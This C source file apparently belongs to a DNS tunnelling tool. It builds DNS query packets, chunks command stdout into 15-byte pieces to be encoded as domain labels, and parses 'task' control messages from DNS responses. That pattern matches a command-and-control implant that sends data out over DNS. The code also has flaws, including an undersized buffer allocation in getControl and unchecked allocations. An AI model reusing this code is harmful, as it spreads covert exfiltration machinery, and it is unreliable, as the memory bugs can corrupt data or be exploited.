// includes
#include <stddef.h>	      // NULL = 0
#include <stdio.h>		  // printf
#include <stdlib.h>		  // exit, malloc
#include <arpa/inet.h>	  // htons
#include "dns-protocol.h" // for calling self createDnsRfcQueryString()
#include "dns-packet.h"   // structure definitions and size calculations
#include "bufferHelper.h" // for copyString
#include "linked-list.h"
#include "sockets.h"

// global variables
unsigned int debug = 0;

/*
 * This module will implement the various functionality associated with
 * sending and receiving dns queries
 *
 * This will be a client side library and is used to interact with any rfc
 * compliant DNS resolving servers,
 *
 */


/*
 * goal - send a dns query packet
 *
 * the sending is implemented by sockets
 *
 * in no particular order we need to do the following before passing a buffer
 * to a socket
 *
 * construct the DNS fields
 *
 *
 */


/*
 * function name - createDnsQueryPacket
 *
 * arguments - _fqdn => The fully qual domain name to go inside QNAME field
 * 						The hostName typically consists of host.SLD.TLD.
 *
 * 			 - _sendLen => the size of our udp payload for socket functions
 *
 * return value - char pointer to created dns packet
 *
 * comments - dnsQueryPacket is the buffer returned that represents a complete
 * dns query buffer, "udp payload", which is passed to a socket.
 */
unsigned char *createDnsQueryPacket(unsigned char _msgType,
										unsigned char *_host,
											unsigned char *_domain,
												int *_sendLen)
{
	// to keep track of put()'s
	int buffIndex = 0;
	unsigned char *dnsQueryPacket;
	unsigned char *hostName = appendString(_host, _domain);
	unsigned char msgType = _msgType;

	unsigned char *hostNameControl = appendString(&msgType, hostName);

	struct DNS_HEADER *ptrStructDnsH;
	struct DNS_QUESTION *ptrStructDnsQ;

	/* create and fill in a DNS_HEADER struct */
	ptrStructDnsH = buildDnsHeader(
						TRANSAC_ID,
						QUERYFLAGS,
						QDCOUNT,
						ANCOUNT_NULL,
						NSCOUNT_NULL,
						ARCOUNT_NULL
						);

	/* create and fill in a DNS_QUESTION struct */
	ptrStructDnsQ = buildDnsQuestion(hostNameControl, QTYPE_A, QCLASS_IN);

	// free HostName here after using it?
	if(hostName != NULL)
		free(hostName);

	dnsQueryPacket = malloc(sizeof(struct DNS_HEADER) +
							(strlen(ptrStructDnsQ->qname)+1) +
								sizeof(ptrStructDnsQ->qtype) +
									sizeof(ptrStructDnsQ->qclass));

	if(dnsQueryPacket == NULL)
	{
		printf(">>> "
			"*dnsQueryPacket = malloc(sizeof(struct DNS_HEADER) + "
			"<<< \n"
			"malloc returned NULL aka failed... exiting \n");
		//retFlag = 1;
		exit(1);
	}

	/* dns header section field member copy */
	putShort(dnsQueryPacket, &(ptrStructDnsH->id), 		&buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->flags),   &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->qdcode),  &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->ancount), &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->nscount), &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsH->arcount), &buffIndex);

	/* dns question section field member copy */
	putString(dnsQueryPacket,
					ptrStructDnsQ->qname,
						strlen(ptrStructDnsQ->qname)+1, // +1 for null root
							&buffIndex);

	putShort(dnsQueryPacket, &(ptrStructDnsQ->qtype),  &buffIndex);
	putShort(dnsQueryPacket, &(ptrStructDnsQ->qclass), &buffIndex);

	// buffIndex is the length of our udp datagram aka dns packet
	*_sendLen = buffIndex;

	return dnsQueryPacket;
}

/*
 * function name - createDnsRfcQueryString
 *
 * arguments - qNameArg ~~> "www.hello.com"
 *
 * return value - pointer to rfc query string
 *
 * comments - this function creates a compliant RFC based dns query string name
 * given a query string in common form such as "www.aol.net" or "www.hi.com"
 *
 * Example Input: www.aolweb.com
 * Example Output: 3www6aolweb3com0
 *
 */
unsigned char *createDnsRfcQueryString(unsigned char *qNameArg,
											unsigned int *rfcQNameLengthArg)
{
	if(debug)
	{
		printf("===== createDnsRfcQueryString() =====	\n");
		printf("qNameArg -> %s 		 	 \n", qNameArg);
		printf("rfcQNameArg -> %u 		 \n", *rfcQNameLengthArg);
	}

	unsigned int retFlag = 0; // no errors
	unsigned char *rfcQName;

	// values for creating a rfc compliant dns query string from a normal one
	unsigned char c;
	unsigned int lengthOctetIndex = 0, rfcQNameIndex = 1, qNameArgIndex = 0;
	unsigned int lengthOctetValue = 0;

	// the size of the newly created rfc query name string = strlen(qNameArg)+2
	unsigned int qNameArgLen = 0;
	if( (qNameArgLen = strlen(qNameArg)) <= 0)
	{
		printf(">>> strlen(qNameArg) <= 0) <<< \n");
		printf("return value was less than or equal to 0.. exiting \n");
		// how to handle errors like this
		exit(1);
	}

	// qNameArgLen = 8, we want to allocate 10 bytes.. arg to malloc = 9
	rfcQName = malloc(sizeof(unsigned char)*qNameArgLen+2);

	if(rfcQName == NULL)
	{
		printf(">>> "
			"rfcQNameArg = malloc(sizeof(unsigned char) * qNameArgLen); "
			"<<< \n"
			"malloc returned NULL aka failed... exiting \n");
		//retFlag = 1;
		exit(1);
	}

	// make sure we loop through every char in qNameArg "orig qname string"
	while ( (qNameArgIndex+1) <= qNameArgLen)
	{
		// retrieve first character from qNameArg
		c = qNameArg[qNameArgIndex];

		if(c == '.')
		{
			// assign length octet index value to rfc query name index value
			lengthOctetIndex = rfcQNameIndex;

			// reset length octet index value for new label section
			lengthOctetValue = 0;

			// increment the query name index by 1
			qNameArgIndex++;

			// increment rfc query name index by 1
			rfcQNameIndex++;
		}
		else
		{
			// not '.' , increment value at length octet index by 1

			// increment value at length octet index by 1.
			lengthOctetValue += 1;
			rfcQName[lengthOctetIndex] = lengthOctetValue;

			// store char at rfc query name index location
			rfcQName[rfcQNameIndex] = c;

			// increment the query name index by 1
			qNameArgIndex++;

			// increment rfc query name index by 1
			rfcQNameIndex++;
		}
	} // done while

	// assign 0 to value at rfc query name index (MAKE SURE string is long enuf
	rfcQName[rfcQNameIndex] = 0;

	// dereference integer pointer, store the value of rfcQNameLength
	*rfcQNameLengthArg = (qNameArgLen+2);

	if(debug)
		printf("=====/end createDnsRfcQueryString() ==========	  \n");

	return rfcQName;
}

/*
 * function name - createDnsHeader
 *
 * arguments - ?
 *
 * return value - ?
 *
 */
struct DNS_HEADER *buildDnsHeader (
						unsigned short id,
						unsigned short flags,
						unsigned short qdcode,
						unsigned short ancount,
						unsigned short nscount,
						unsigned short arcount
						)
{
	if(debug)
	{
		printf("===== createDnsHeader() ===== \n");
		printf("id -> %u 		\n", id);
		printf("flags -> %u    \n", flags);
		printf("qdcode -> %u    \n", qdcode);
		printf("ancount -> %u   \n", ancount);
		printf("nscount -> %u   \n", nscount);
		printf("arcount -> %u   \n", arcount);
	}

	// allocate memory for the DNS_HEADER structure, this should only be done
	// once for the life cycle of the program
	struct DNS_HEADER *ptrStructDnsH = malloc(sizeof(struct DNS_HEADER));

	if(ptrStructDnsH == NULL)
	{
		printf(">>> "
			"struct DNS_HEADER *ptrStructDnsH = malloc(sizeof(struct "
			"DNS_HEADER)); "
			"<<< \n"
			"malloc returned NULL aka failed... exiting \n");
		exit(1);
	}

	// fill the fields of the DNS HEADER structure
	ptrStructDnsH->id	 	= htons(id);
	ptrStructDnsH->flags 	= htons(flags);
	ptrStructDnsH->qdcode 	= htons(qdcode);
	ptrStructDnsH->ancount 	= htons(ancount);
	ptrStructDnsH->nscount	= htons(nscount);
	ptrStructDnsH->arcount	= htons(arcount);

	if(debug)
		printf("===== /end createDnsHeader() ===== \n");

	return ptrStructDnsH;
}

/*
 * function name - createDnsQuestion
 *
 * arguments -
 *
 * return value - pointer to DNS_QUESTION structure
 *
 * comments - We will malloc 8 bytes for the structure itself, the first 4
 * bytes will have to point to block of memory "contain the address of"
 * a string of size x bytes that holds our qname. So pre-requisits for this
 * function to be called are below
 * 1.) Having an already created qname
 * 2.) Knowing the length of the qname string... including length octets, etc..
 *
 * Let's also have the ability to create a compliant DNS query string based
 * on the received qname Arg, ie, "www.hello.com" is not compliant and would
 * be passed to the appropriate routine.
 */
struct DNS_QUESTION *buildDnsQuestion(unsigned char *qNameArg,
											unsigned short qtypeArg,
												unsigned short qclassArg)
{
	if(debug)
	{
		printf("===== buildDnsQuestion() ===== \n");
		printf("qNameArg -> %s 			\n", qNameArg);
		printf("qtype -> %u 			\n", qtypeArg);
		printf("qclass -> %u			\n", qclassArg);
	}

	unsigned int rfcQNameLength = 0;
	unsigned char *rfcQName;

	// allocate memory for the DNS_HEADER structure
	struct DNS_QUESTION *ptrStructDnsQ = malloc(sizeof(struct DNS_QUESTION));

	if(ptrStructDnsQ == NULL)
	{
		printf(">>> "
			"struct DNS_QUESTION *ptrStructDnsQ = malloc"
			"(sizeof(struct DNS_QUESTION)); "
			"<<< \n"
			"malloc returned NULL aka failed... exiting \n");
		exit(1);
	}

	// create a compliant DNS query name that returns the string and length
	rfcQName = createDnsRfcQueryString(qNameArg, &rfcQNameLength);

	if(rfcQName == NULL)
	{
		printf(">>> "
			"rfcQName = createDnsRfcQueryString(qnameArg, &rfcQNameLength); "
			"<<< \n"
			" returned null aka error(s) = 1... exiting \n");
		exit(1);
	}

	// alloc memory to hold the qname string.. the passed in qname will be
	// copied to the memory location pointed to by ptrStructDnsQ->qname
    ptrStructDnsQ->qname = malloc(sizeof(unsigned char)*rfcQNameLength);

	// copy qname string argument to the qname member of DNS QUESTION struct
	if (copyString(ptrStructDnsQ->qname, rfcQName, rfcQNameLength) < 0)
	{
		printf(">>> "
			"copyString(ptrStructDnsQ->qname, qnameArg, qnameLengthArg)"
			"<<< \n"
			"malloc returned -1 aka failed... exiting \n");
		exit(1);
	}

	// assigned remaining struct field members
	ptrStructDnsQ->qtype  = htons(qtypeArg);
	ptrStructDnsQ->qclass = htons(qclassArg);

	if(debug)
		printf("=====/end buildDnsQuestion() ===== \n");

	return ptrStructDnsQ;
}


/*
 * function name - buildStdoutChunk list
 *
 * arguments - stdoutBuffer => represents a chunk of a larger stdout buffer
 *			   stdoutSize   => represents the size of the stdout Buffer
 *
 * return value - pointer to the head node of this list !
 *
 * comments - If no chunking, list should have 1 node excluding head node?
 *
 * 			  When to use strlen vs, custom strlen for non-ascii bytes?
 * 			  Strlen should be okay unless we have 0's null bytes in our
 * 			  stdout.. we should have all ascii bytes anyway, but 0
 * 			  may cause strlen to return early.. 0 ascii is hex 30
 * 			  hex 0 is NULL byte.. may be okay still??
 *
 * 			  Check return values of malloc.. free when?
 *
 * 			  Function is cool because it seperates the functionality of
 * 			  chunking then sending right away, to chunking and store,then send
 * 			  when ever you want at what ever pace and order desired !
 *
 * 			  When appending a std out chunk to domain name, need to add
 * 			  a period to the end of the stdout buff sdfijsdiofjsdf>.<cnn.com
 *
 */
struct NODE *constructStdoutList(unsigned char *_stdoutBuffer,
									int _stdoutSize)
{
	if(debug)
	{
		printf("===== constructStdoutList() ===== \n");
		printf("stdoutBuffer> %s \n", _stdoutBuffer);
		printf("stdoutBuffer Size-> %u 	 \n", _stdoutSize);
	}

	// each list member structure defined below
	int chunkSize = 15; //global variable to modify? --- with encoding, stdoutBuff is 2x longer
	int mallocAmt = 0;
	struct NODE *head = NULL;

	// keep track of index into _stdoutBuffer.. while loop here?
	int bytesTransmitted = 0;
	int bytesRemaining = _stdoutSize;

	// while we have not grabbed each byte of stdout
	while(bytesRemaining > 0)
	{

		if(bytesRemaining <= chunkSize)
		{
			enqueue(&head, &(_stdoutBuffer[bytesTransmitted]), bytesRemaining);
			bytesTransmitted = bytesRemaining;
			bytesRemaining = 0;
		}
		else // we have at least 1 more than chunkSize bytes left
		{
			enqueue(&head, &(_stdoutBuffer[bytesTransmitted]), chunkSize);
			bytesTransmitted = (bytesTransmitted + chunkSize);
			bytesRemaining = (_stdoutSize - bytesTransmitted);
		}
	}

	if(debug)
		printf("=====/end constructStdoutList() ===== \n");

	return head;
}


/*
 * function name - parseDnsResponse
 *
 * arguments -
 *
 * return value - ?
 *
 * comments - purpose of function is to parse a dns response. I guess we could
 * 			  implement server control creation here, but leave fields alone
 * 			  incase we need them later?.
 *
 */
struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
												int _recvBuffSize)
{
	if(debug)
	{
		printf("===== parseDnsResponse() ===== 	\n");
		printf("_recvBuffer: %s \n",   _recvBuff);
		printf("_recvBuffSize: %u \n", _recvBuffSize);
		printf("----------------------------	\n");
	}

	int buffIndex = 0;
	struct DNS_RESPONSE_PACKET *response = NULL;
	response = malloc(sizeof(struct DNS_RESPONSE_PACKET));

	/* fetch dns header fields from reply */
	fetchShort(&(response->dnsHeader.id), 	    _recvBuff, &buffIndex);

	puts("finished first fetch \n");
	fetchShort(&(response->dnsHeader.flags),    _recvBuff, &buffIndex);
	fetchShort(&(response->dnsHeader.qdcode),   _recvBuff, &buffIndex);
	fetchShort(&(response->dnsHeader.ancount),  _recvBuff, &buffIndex);
	fetchShort(&(response->dnsHeader.nscount),  _recvBuff, &buffIndex);
	fetchShort(&(response->dnsHeader.arcount),  _recvBuff, &buffIndex);

	/* fetch dns question section from reply */
	int qNameLen = strlen(&(_recvBuff[buffIndex])) + 1;
	printf("qNameLen: %u \n", qNameLen);
	response->dnsQuestion.qname = malloc(sizeof(unsigned char)*qNameLen);

	fetchString(response->dnsQuestion.qname,    _recvBuff, qNameLen, &buffIndex);
	fetchShort(&(response->dnsQuestion.qtype),  _recvBuff, &buffIndex);
	fetchShort(&(response->dnsQuestion.qclass), _recvBuff, &buffIndex);

	/* fetch dns answer section from reply */
	fetchShort(&(response->dnsAnswer.name),     _recvBuff, &buffIndex);
	fetchShort(&(response->dnsAnswer.type),     _recvBuff, &buffIndex);
	fetchShort(&(response->dnsAnswer.class),    _recvBuff, &buffIndex);
	fetchInt  (&(response->dnsAnswer.ttl),      _recvBuff, &buffIndex);
	fetchShort(&(response->dnsAnswer.rdlength), _recvBuff, &buffIndex);
	fetchInt  (&(response->dnsAnswer.rdata),    _recvBuff, &buffIndex);

	// end func
	if(debug)
		printf("====/end parseDnsResponse() ==== \n");

	return response;
}

void printDnsResponse(struct DNS_RESPONSE_PACKET *resp)
{
	printf("[+] Printing DNS Server Response \n");

	// printing dns header
	printf("\n== DNS HEADER SECTION == \n");
	printf("TRANS ID %hx     \n", ntohs(resp->dnsHeader.id));

	printf("FLAGS: %hx       \n", ntohs(resp->dnsHeader.flags));
	printf("QUEST COUNT: %hx \n", ntohs(resp->dnsHeader.qdcode));
	printf("ANSW RRs: %hx    \n", htons(resp->dnsHeader.ancount));
	printf("AUTH RRs: %hx    \n", htons(resp->dnsHeader.nscount));
	printf("ADDIT RRs: %hx   \n", htons(resp->dnsHeader.arcount));

	// print dns question section
	printf("\n== DNS QUESTION SECTION == \n");
	printf("QUESTION NAME: ");
	stringPrinter(resp->dnsQuestion.qname, strlen(resp->dnsQuestion.qname)+1);
	printf("\n");
	printf("QUESTION TYPE %x  \n",		   ntohs(resp->dnsQuestion.qtype));
	printf("QUESTION CLASS %x \n", 		   ntohs(resp->dnsQuestion.qclass));

	// print answer
	printf("\n== DNS ANSWER SECTION == \n");
	printf("RESPONSE NAME PTR: %hx    \n", ntohs(resp->dnsAnswer.name));
	printf("RESPONSE TYPE: %hx        \n", ntohs(resp->dnsAnswer.type));
	printf("RESPONSE QUERY CLASS: %hx \n", ntohs(resp->dnsAnswer.class));
	printf("RESPONSE TTL -> %x	      \n", ntohl(resp->dnsAnswer.ttl));
	printf("RESPONSE DATA LEN>: %hx   \n", ntohs(resp->dnsAnswer.rdlength));
	printf("RESPONSE DATA: %x         \n", ntohl(resp->dnsAnswer.rdata));
}

void printControlFields(struct CONTROL *c)
{
	printf("[+] Printing Control Fields \n");

	// printing dns header
	printf("Client id: %u \n", 		c->clientId);
	printf("Message Type: %u \n", 	c->messageType);
	printf("Message Length: %u \n", c->messsageLength);
	printf("Message <task>: "); stringPrinter(c->message, c->messsageLength);
	printf("\n");
}

// create control struct that is perhaps protocol agnostic
// this is used for parsing responses
// not modifying values of drp, pass by value is ok
// bugs -- if sizeofMessage - "control bytes (2)" > size of label qname[0]
// another BUG -- the message should not be longer than qname itself...
struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
{
	if(debug)
	{
		printf("===== getControl() ===== 	\n");
	}

	struct CONTROL *ctrl = malloc(sizeof(struct CONTROL));

	char endOfStr = '\0';
	int z = 0;
	unsigned char labelLength;
	fetchChar(&labelLength, drp->dnsQuestion.qname, &z);
	//printf("label length: %u \n", labelLength);

	int offset = MESSAGE_TYPE_PARSE_OFFSET;

	/* get messageType */
	fetchChar(&(ctrl->messageType), drp->dnsQuestion.qname, &offset);

	/* get messageLength */
	fetchChar(&(ctrl->messsageLength), drp->dnsQuestion.qname, &offset);

	//printf("orig mesg length: %u \n", ctrl->messsageLength);

	if(ctrl->messsageLength > labelLength)
	{
		//puts("messageLength is way too longer! ");
		ctrl->messsageLength = labelLength;
	}

	/* get message itself */
	// 1.) allocate storage for message (+1 byte for null termination)
	ctrl->message = malloc(sizeof(ctrl->messsageLength)*sizeof(unsigned char)+1);
	fetchString(ctrl->message,
					drp->dnsQuestion.qname,
						ctrl->messsageLength,
							&offset);

	// null terminate string
	putChar(ctrl->message, &endOfStr, &offset);

	if(debug)
		printf("====/end getControl() ==== \n");

	return ctrl;
}
